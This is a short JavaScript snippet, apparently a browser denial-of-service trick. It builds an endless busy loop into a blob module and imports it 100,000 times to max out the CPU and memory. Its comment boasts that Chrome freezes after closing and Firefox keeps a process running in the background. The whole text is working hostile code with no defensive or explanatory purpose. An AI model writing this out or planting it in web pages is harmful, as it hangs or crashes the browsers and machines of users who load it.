/*
This puts load on the CPU and eats up memory. 
When closed, 
    ...in Chrome it will freeze for some time
    ...in Firefox it will leave process running in the background. 
*/

// prettier-ignore
;((n) => {
    f = () => { while (1) Math.random() * Math.random() }
    b = new Blob([`(${f.toString()})()`], { type: 'text/javascript' })
    for (i = 0; i < n; i++) import(URL.createObjectURL(b))
})(100_000)
